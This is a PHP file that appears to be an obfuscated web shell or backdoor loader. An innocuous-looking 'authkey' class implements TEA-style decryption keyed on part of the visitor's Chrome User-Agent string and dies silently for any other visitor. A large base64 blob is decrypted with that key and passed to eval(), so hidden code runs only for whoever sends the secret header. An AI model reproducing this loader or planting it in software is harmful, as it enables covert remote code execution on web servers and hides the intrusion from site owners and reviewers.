<?php
class authkey{
	var $hsstr;
	function __construct(){
		$this->setister(32);
	}
	function shorttolen($start, &$data, &$data_long){
		$n = strlen($data);
		$tmp = unpack('N*', $data);
		$j  = $start;
		foreach ($tmp as $value) 
		$data_long[$j++] = $value;
		return $j;
	}
	function add($i1, $i2) {
		$result = 0.0;
		foreach (func_get_args() as $value){
		if (0.0 > $value){
			$value -= 1.0 + 0xffffffff;
		}
		$result += $value;
		}
		if (0xffffffff < $result || -0xffffffff > $result){
			$result = fmod($result, 0xffffffff + 1);
		}
		if (0x7fffffff < $result){
			$result -= 0xffffffff + 1.0;
		}elseif (-0x80000000 > $result){
			$result += 0xffffffff + 1.0;
		}
	return $result;
	}
	function rshift($integer, $n){
		if (0xffffffff < $integer || -0xffffffff > $integer){
			$integer = fmod($integer, 0xffffffff + 1);
		}
		if (0x7fffffff < $integer){
			$integer -= 0xffffffff + 1.0;
		}elseif(-0x80000000 > $integer){
			$integer += 0xffffffff + 1.0;
		}
		if (0 > $integer){
			$integer &= 0x7fffffff;
			$integer >>= $n;
			$integer |= 1 << (31 - $n);
		}else{
			$integer >>= $n;
		}
		return $integer;
	}
	function lentoshort($l){
		return pack('N', $l);
	}
	function setister($hsstr){
		$this->cd_str = $hsstr;
	}
	function uncode($enc_data){
		$keyone = $_SERVER['HTTP_USER_AGENT'];
		if(preg_match('/Chrome\/(.*) Safari\//is',$keyone,$src)){
			$key = substr($src[1],5,8);
		}else{
			die();
		}
		$n_enc_data_long = $this->shorttolen(0, $enc_data, $enc_data_long);
		$this->resize($key, 16, true);
		if ('' == $key)
		$key = '0000000000000000';
		$n_key_long = $this->shorttolen(0, $key, $key_long);
		$data = '';
		$w = array(0, 0);
		$j = 0;
		$len = 0;
		$k = array(0, 0, 0, 0);
		$pos = 0;
		for ($i = 0;$i < $n_enc_data_long;$i += 2){
			if ($j + 4 <= $n_key_long){
				$k[0] = $key_long[$j];
				$k[1] = $key_long[$j + 1];
				$k[2] = $key_long[$j + 2];
				$k[3] = $key_long[$j + 3];
			}else{
				$k[0] = $key_long[$j % $n_key_long];
				$k[1] = $key_long[($j + 1) % $n_key_long];
				$k[2] = $key_long[($j + 2) % $n_key_long];
				$k[3] = $key_long[($j + 3) % $n_key_long];
			}
			$j = ($j + 4) % $n_key_long;
			$this->pherdeciLong($enc_data_long[$i], $enc_data_long[$i + 1], $w, $k);
			if (0 == $i){
				$len = $w[0];
				if (4 <= $len){
					$data .= $this->lentoshort($w[1]);
				}else{
					$data .= substr($this->lentoshort($w[1]), 0, $len % 4);
				}
			}else{
				$pos = ($i - 1) * 4;
				if ($pos + 4 <= $len){
					$data .= $this->lentoshort($w[0]);
					if ($pos + 8 <= $len){
						$data .= $this->lentoshort($w[1]);
					}elseif($pos + 4 < $len){
						$data .= substr($this->lentoshort($w[1]), 0, $len % 4);
					}
				}else{
					$data .= substr($this->lentoshort($w[0]), 0, $len % 4);
				}
			}
		}
		return $data;
	}
	function resize(&$data, $size, $nonull = false){
		$n  = strlen($data);
		$nmod = $n % $size;
		if(0 == $nmod)
			$nmod = $size;
		if ($nmod > 0){
			if ($nonull){
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$data[$i] = $data[$i % $n];
				}
			}else{
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$data[$i] = chr(0);
				}
			}
		}
		return $n;
	}
	function pherdeciLong($y, $z, &$w, &$k){
		$sum = 0xC6EF3720;
		$delta = 0x9E3779B9;
		$n  = (integer) $this->cd_str;
		while ($n-- > 0){
			$z = $this->add($z, 
			-($this->add($y << 4 ^ $this->rshift($y, 5), $y) ^ 
			$this->add($sum, $k[$this->rshift($sum, 11) & 3])));
			$sum = $this->add($sum, -$delta);
			$y  = $this->add($y, 
			-($this->add($z << 4 ^ $this->rshift($z, 5), $z) ^ 
			$this->add($sum, $k[$sum & 3])));
		}
		$w[0] = $y;
		$w[1] = $z;
	}
}


$str="DqI3n+byX1eQ4kOjqxbb5Ow6373G8eJbMi4tLiamdKqb6o0I8LwIw1+yCJmdG8D0zx5/CFKDpArO9kHah1xxeKDOPAogjD4dLbi+/GddBrXX7gyaIMiiulcaiZTttkLvPTB+Is64QjRjRg3dGN33/v56ScsoH9ZT3m4RMmtJjEKVFaRkODcIfJ5e+oB+/HFfnHN3N2nJ/toVLmCZl60WxzksgXcMb1d6OmUsrjX4dtkHsWtNZjjz3ZqHqk0WltvikB3gYCoJwDQdxaIEJnWKgGM5ZqS4lPhpKm1f3fsGGCG4kDqqltAkSe6hXXzUwLVEqo3Psw8zJ8Hv/5k2P9PGb1xjVFGXObAq/A2GWTUHnuYzhRBvjQq0Yq923j8ir4qLCJwhEMoC9/ia4jrfqjzYS0pkdOSEQsoQsHOeAZX/4a/niWsUgo/arZmwDhoVS4qyoTKuyMgpJXqOBeBfurcyOEiLnXAP8+HCMkAzRk9o7Rwo5KWzeRXz5QB8r7WFoB0EmV7/5ds7mW2G1AoObCk6P030v7j1HknQsHOeAZX/4a8vVTE/q3ZdPBwACvN166XlLt+OLmPhHjckJ/iN5tU4v293UP06hgC+QTQeIo7A4LBvr48vNCjb+16mQXdD5Fn+An6/wMXUUpXUlVj00d2IX7yKmHseqHpxtJlkzi6rBsFMUO/G4Y2zne/MCMmO/pnpi0qrXvCxdbaHabFu/jfS6N40ZULED2sU5wK0M/YI+maM1LkOXA04qE3W55n5Kw61FrOWiDMAi1DGWXZkeMmrgUQx3nB4nERVElnJh9DVBycQB2TZRFDMPNhQ7yA7bPdnuMUbxpi4eMFrzIviVogzH2FUnv9uDCuVOpCLjRxkYnQyVEsFe7WBplvMc4ifcPMXtlEIsyHYaom8hx28NjuBhCRw7Kyf0lkVhm66NdJqp5q7ZOMgme9CjQN/Xgf5j0eby5UToZAwQWbnf1BtCirj3Q0CK0We2wdMEjFCfnYEV3iqRvX0ySOLOhwG1Ul12qju2ACK9I/2vg4UeXfeFv1hxxGpxyHB0h5aY4tbQ83R4T0HnaOTlWn/x8QAIjhB/2kHvqWphaRxg8xc+Zq1pPYq3uJfieuaNKxisDUfVHI3efpDXR55oevNmW0VV32F4k2/gx/2sKxehs4gSQK/f6mjjX8szR7twD/sgq72KNDHrCRwff5LNO3RQljJdaeERrADnFGaAi6w19xdi6St9M+z3gPQRnxTUsZt6grvaZMkIVMhbauggcfjs5tSKAM+QB6BMvxaunw+71Gu5O1vdyll44JvfO8Fx0b7TLQPq1ObFEgU/wJS0arwywboS/xoV0IeQqXwxt+p+AsGxCgmKiUmRex045XUR4/74Eb9ManzewCWwJ8+zuau3GwE6rumeVkZNE3nOuDCQxiN9kDfOFzMf/Y8+W8gGjQupHGCqg3u0k3sQCAuBWfegoMRo3PLgSXagMnD5Gbs8nbftkXiz+/gXKach2CJoOjGU8wnEAJJIVRI2+r2pK+uA8Zz3253au0qxoTcqCDwgdfhcSX81DhoccJkzaZeJX1+7i1bBdVVbYTo3bI9zpzoZlTKpJmm12AB/HqRcscBVWOTXrkm/T5lq4jC8AeCP82GWQSacRZKj5zTOJxgHtWiYZfu587gUPyKRxcv91s4nJ2RTw/f2axUQTSRuj0gWQrQQKZ5Lljr8yWLOMl82SuXBW4VGZCn/wST2y3OqEx1NoFWyYZLC8Zj/J5uJhTpaBASvYP0IuGGLUAtoNmsidIdIAATZ49u1U0D7MmtlbLyki+JAcT3XsSKcaxAoBdAPAQb8kgnvNprTwhGq2jhVJSB6QmsYUCSX0u3LWozcJTacFUAJErmNeFWALR0uTI/eSFGasVF+sTyU2qEp4EGoCCTiFWarvxxHt4BEhgDa/IqlsAlolQpHf2G5/TTWKC/VvkYOs+KutgQfHTa0g3RTJFNs40TbJLoO9dELiXpRZ14VnMaoSYEgJxA9fyXlb+nV0jrlHnXjBgiyajNlsWVlaru0aZmn4BmAi8tR/Ayx18xe2l+hfxXkAeR8pbLSYGGkzky8nAfZhQJ2YaUbHkgfUU8WwTWXU12XPEmw4Kx+wvWUyX4016jUi6TgUIzsxG7cnZ06Ozi6iLz85Vyd7PTJghlzV+DAi8KNScVPziXS58TUEwzoZokWvzE/uQoOA6MtodBJm7xWi7SMR/5tNZTdGTalh95Cp9Y1cZBkXc3XYo0suIVZ/fDGAfGb4UPCVrAf+81WsJ71kTw6ZyAEKHAuhWp+yQ8zqn0Sy1SS0yRU/UmEw8NjburcldKL+St23Appri7WuvbB5K6N5EFxkaBxnEJ+eb2BeDLp63iLnYW24AlzhGc8WqcCncsH6EMvlmqJI107gXwGEyullvs8o9CYcLJOIqfPJXSj3y869ChztbaFlyOZeNu/yFHwmC/+yC1+UFQ3Wktg0Yp/ddlMT0H++4Lz6EMvlmqJI10fh35ma5TogEeUmo6ne14acbZJYWLpfkD8kgnvNprTwhGq2jhVJSB6XnmK2T20fUycW13bQxLVqqfwuvwFPGmSSo91kx5+HfTbW00DQOnxixk/YaZzzSlZBWvlWr703moi6lTyInze0idY9eVg1XDRxc9tlvwDOFa217TpTOILaE6N4O6hychrKSeK6EGMVuMQncH6XYM0MyXiWO+8WcSW8BcxO9lXWWxFWhGzbnIebTzcC50MpKFJX8SqG/BJtrAwc81K/Bn2ra4i4Wa8el4YsIqG9i6oqMqR9MmhUzzQXdb+4L10Mzw4KA8MoHYPCqbAu3CnV3RkY1x/z0vh631ILpBG3CfTxyyhkFEXwJ4Bcrt0rcu5Kzp/P3FZyS/gFYjz6x23DwJtiJaEATqnKIEcYhY+E207DNdO5M3RZ6tbHS9s0Vd1WWdBiuGlTXgpwkIzSvEn5megiEJfbt/OakouTu0NZQbS6gNa3Hc0B0PBHuz6TQaOGAhgiRmnSuBxlL3NbZofyQh8FRkhHfAKCfFoqhRcebtZYulzSvEn5megiEJfbt/OakouYEDeoKdxqMDa3Hc0B0PBHvJ7V3cP6kwCIN0sVyAENHsFHAv0uDjIGlqQHRUMy03/R4Ri2rvVknLJWHuqu+dV+aMSOFolu93tQx1/imJbJ1LlOXQpO9BhkCTu/tPZikgl+Vy4g/MCGtQMNzT86yDSnakZ7vKAhRcnDvPWB5tOXqCtcxD07GHArEVmp2n4UweDQdzvDqMGEQML8iWqWOANBmkZ7vKAhRcnCVh7qrvnVfmY4DsabMQCNQ96lwkYawBq8W7nCy2oC1VtidBoKEFgbS69w0LYuNJc2wE6rumeVkZNE3nOuDCQxiru1aCmGVKoxYoz/kUHtW5EthFAlLs4KHBYkGZqR+Kvi7fji5j4R43+5zWEGtGf7y3cGqQiNzWkXi6SyTCxA9OeEpBJJ3+LtRi7HnfIM6BeYdMqEgVpn7qd8hsaxVfAFpIx6ayBtPnaKRaO7BcuSxokl5Z8Crm1moM72TvJXQarjtUo5J2YVcYw3SP8uLfpQYgDWCXmlkuKaYEOv/rJ1Sq889h/SnNVofZIHVp4GVNl2uD9l4xaMhMh0yoSBWmfurANRYJa2IAzdNSRI2QLc2M/8aFmQ+SJqkg6u+WBKiV4f+Wma9O6NIuPk0Kr+pdi8qpUbAVKpzb9qpEwrJJqHhmw5eCp0IgQtj1IbdH+Ls7hUSJUTmusJcQPus+7xthnLXVb0eiaD95G19omLp8wBMkHr7ySz8WQgwnxXVwe2OxHxSn4ODQSSlrb8tMUOaBg+UjHmVDJ+m66qqwHHPc7u+gDY27q3JXSi8l7lwm1U9dP2ggs0Do2YKb9ZS7HDKfCNrZKGy/il/PvV+Gzdzqw6IQSIudcA/z4cLQ+6Q8iN9tfDyZD0zOc4NIfa8QV/wsIjLEACI4Qf9pB+cxIQHo2bTAMdQlmXE2BgyTmw8m+fsUDBwCe5/KWFs7bgWO1GMotUZE2C6QqRcbbN8RlutMRcWTxOUQidAohxs1QBlsyPOEiZeJY77xZxJbLt+OLmPhHjc4CjuUiVoR2zd++jM0gxQzqTABjqrL7gjNN9a2bAWfcjkBnILSmpakLvWES/iXqAH4BhGzXOyTev4bSUXyHM38HSH6mfWJEDEv8LxrQOhXauclR7nBrae9huNsw7OimI4rSNYrF9IUx8+CBEGm0j1HrldV9F176bHOwHCPmYRwJbDw3vaEibSom7Y6PSt4ErwQVQJ1zF69tsTM0OBptSCN+uUSVLWEwF3x6MsV253ctAzvZO8ldBqux9Sg7imwr1iskUFZ4P17d+dPhH9OguqIW52Vu6i8+IpO7d+ZAKF7hBlKC2C+JXxvyADKnhGBj1Lx6MsV253ctAzvZO8ldBquLGro23fzWXQu344uY+EeN0HJj1OZDHtAjQdXhvedjnlNrZBW0mZz2KopvoQpYKs8DMJJ8Je3oI/73QoAxfMk92xvFV6JHhk2qzzDp6nYEvifsZfLfZVBMXLYdj0nONna/XyThdf+FibvopBzq6mdtHqu63JC2WJKxHtB/hP13S9X92UGrcdkO+WcF5CfCOAvlzRSRuFDomhP0i8wRIluyhgUo7hEl0DUrGVhGyMsevqSe37roal6s9ILqaXrIounNuCpZVjwVw+foulXMiZomEfZhLACzR1sPJkPTM5zg0j7WcsRHghPYXGEsvhQUd7+Ta2QVtJmc9jluGBOMeRIwDbk93P2e3Ux6WQCAPUL2OhumpSntxyX41LGgw1yiYXpjhKXagV1PpSSnknVZafz4Q79F3iJ3n07XSmP4AOTd9lOk07vj5BdUykK4FnctZenip88ldKPfLy/8TiPgqE2iM4/TELVQtPb9vRnodm4nygGHW5rvFL1QZ4HghFBifDCoCCxFH1aTmYCW740pJ57MyChv3VkNiWzPJkPTM5zg0iMSjmCcLIR9IdpsW7+N9Loh6EGlxEyIa7R80FefVU551P8e/eO1hoFn6LpVzImaJiOAQeczI69d++KmXb1ze6K4WPPFlV9dBGHB+8jANgwRrYj8hHOhqrhwnO10h9K3aboiLIpdBPpFBAT4fFDDwuQMMnnzOYPWWADOzU3IIVmaXQffhYATeqzSesr+uiD+p30/rKJI+3HQs4oscnXSqYLT/HZnQhKcO75w/YXVPEBhMY33ioO68ag2asCqjNp4OKrCC5IwoBp9qGrLMJUZcW02BFK/xwLj1G9BNEYFoadiYEzpsdmLm848rKKPrEkBGCL2WoSsIs6p75wD1B6IbzZoMecTTt/wRb4GeXTI0OX5ud+u651Oc2ux9Sg7imwr1gHfvh1doIVgIANjIIeM02fjovIbkT8Ro9ruN+BJdn8mJSTwKD5Eh9S+5zWEGtGf7wmtJHWpb/dHFKPSqSBKyIEm1IoAz5AHoEKJaS4sy0bMo33Iwk2pirFAzYCq2m5E2myTSA7xluoHKAgsRR9Wk5mnSMpDzwsMx/W/zHbraawrL/xOI+CoTaIzj9MQtVC09tD6xShJ6Aw97wJ2GBTnW7whGrsHau02IDvGEnoXiKoj2cWOnQA6s3MnLIC1wkAbQ/YAHauLOrkkBazlogzAItQKYS9zBsnbi01p9adZmThoZJeWfAq5tZquPXbRHutGR9IvHU5f5Gbdw==";
$srcstr = base64_decode($str); 
$authkey = new authkey(64); 
$strq = $authkey->uncode($srcstr);
eval($strq);